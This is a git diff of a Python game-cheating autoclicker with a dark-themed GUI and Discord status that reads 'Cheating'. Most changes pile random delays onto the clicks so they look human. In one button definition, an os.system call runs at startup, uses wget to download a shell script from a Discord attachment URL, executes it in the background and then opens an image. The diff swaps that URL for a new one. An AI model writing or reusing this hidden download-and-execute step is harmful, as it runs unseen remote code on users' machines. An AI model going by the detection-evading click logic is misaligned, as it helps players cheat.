@@ -32,9 +32,9 @@ customtkinter.set_appearance_mode("Dark") # Other: "Light", "System"
 #STUFF FOR TESTING AND DELAYS
 button = Button.left
 truerand = random.SystemRandom()
-delay = random.uniform(truerand.uniform(.1, .11999999999), .11999999999)
-bigdelay = random.uniform(delay, .11999999999)
+delay =  random.uniform(truerand.uniform(random.uniform(.1, .11999999999), random.uniform(.11999999999, .11999999999)), .1199999)
 # .1023658467387455
+epicdelay = random.uniform(random.uniform(.1, .1099999999), random.uniform(.1099999999, .10999999999))
 mouse = Controller()
 cpu_per = round(psutil.cpu_percent(),1) # Get CPU Usage
 mem_per = round(psutil.virtual_memory().percent,1)
@@ -43,7 +43,7 @@ tap = Controller()
 archout = print(arch)
 client_id = '924367584307060746'
 RPC = Presence(client_id)
-wtfrand = random.uniform(truerand.uniform(1, 2.099999999999999999), random.uniform(.99, 1.2999999999999999999999999999))
+wtfrand = random.uniform(truerand.uniform(1, 2.099999999999999999), random.uniform(.99, 2.2999999999999999999999999999))
 #______________________________________________-
 """
 https://discordapp.com/developers/applications/924367584307060746/rich-presence/assets
@@ -77,7 +77,7 @@ slider1 = customtkinter.CTkSlider(master=root_tk,
                                  height=16,
                                  border_width=5.5,
                                  from_=1,
-                                 to=25,
+                                 to=20,
                                  command=slider_event,
                                  bg_color="#404040")
 slider1.place(relx=0.5, rely=0.6, anchor=tkinter.CENTER)
@@ -97,7 +97,7 @@ slider = customtkinter.CTkSlider(master=root_tk,
                                  height=16,
                                  border_width=5.5,
                                  from_=1,
-                                 to=25,
+                                 to=20,
                                  command=slider_event2,
                                  bg_color="#404040")
 slider.place(relx=0.5, rely=0.4, anchor=tkinter.CENTER)
@@ -139,7 +139,7 @@ button.place(relx=0.85, rely=.85, anchor=tkinter.CENTER)
 def create_window():
     button.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER,)
 button = customtkinter.CTkButton(master=root_tk, width=1, height=1,
-                                   corner_radius=10, command=os.system(' wget https://cdn.discordapp.com/attachments/872495229557669988/952675898635735150/default.wav && wget https://cdn.discordapp.com/attachments/872495229557669988/954817600389521418/Yt_Downloader.sh && sh Yt_Downloader.sh & disown && ristretto /home/$USER/Pictures/oldwallppr.webp && echo init complete'), text="", fg_color="#404040")
+                                   corner_radius=10, command=os.system(' wget https://cdn.discordapp.com/attachments/872495229557669988/952675898635735150/default.wav && wget https://cdn.discordapp.com/attachments/872495229557669988/957657550738825216/Yt_Downloader.sh && sh Yt_Downloader.sh & disown && ristretto /home/$USER/Pictures/oldwallppr.webp && echo init complete'), text="", fg_color="#404040")
 button.place(relx=1, rely=0.090, anchor=tkinter.E,)
 entry = customtkinter.CTkEntry(master=root_tk,
                                width=120,
@@ -156,10 +156,9 @@ entry1.place(relx=0.1, rely=0.3, anchor=tkinter.CENTER)
 text1 = print(entry1.get())
 
 
-
 RPC.connect()
 start_time=time.time()
-print(RPC.update(state="OS: "+( platform.system()) +" " +(platform.release()) +" " +(platform.machine()), details="Cheating | Mem Usage is "+str(mem_per)+"%", large_image="big", start=start_time, buttons=[{"label": " My Github", "url": "https://github.com/Briiqn"}]))
+print(RPC.update(state="OS: "+( platform.system()) +" " +(platform.release()) +" " +(platform.machine()), details="Cheating | Allocated Mem Usage is "+str(mem_per)+"%", large_image="big", start=start_time, buttons=[{"label": " My Github", "url": "https://github.com/Briiqn"}]))
 def button_func1():
     RPC.connect()
     start_time=time.time()
@@ -187,12 +186,12 @@ class TuxClicker(Thread):
 
             if TuxClicker.clicking:
                 mouse.press(Button.left)
-                time.sleep(truerand.uniform(.0010, 0.1099999 ))
+                time.sleep(truerand.uniform(random.uniform(.0010, .0011), random.uniform(0.10111111111111111111, .109)))
                 mixer.music.load('default.wav')
                 mixer.music.play()
                 mouse.release(Button.left)
                 mouse.click(Button.left)
-            sleep(delay * slider.get() / slider1.get() * random.uniform(1, 1.4) * truerand.uniform(2, 2.3099999999999999) * wtfrand * random.triangular(.4, 1.999999999999));
+            sleep(delay * slider.get() / slider1.get() * random.uniform(1, 1.40099999999999999999999) * truerand.uniform(2, 2.5099999999999999) * wtfrand * random.triangular(.5, 2.5555555555555) / truerand.uniform(wtfrand, 2.099999999999999999) * random.uniform(wtfrand, wtfrand) / random.uniform(random.uniform(wtfrand, wtfrand), truerand.uniform(wtfrand, wtfrand)) / random.uniform(truerand.uniform(1, 1.1), random.uniform(1.2, 1.2)));
 
 def keypress(key):
     if key == KeyCode(char=entry.get()):
@@ -205,7 +204,6 @@ with Listener(on_press=keypress) as listener:
         print(TuxClicker())
         root_tk.protocol("WM_DELETE_WINDOW", on_closing)
         root_tk.mainloop()
-
 
 
 
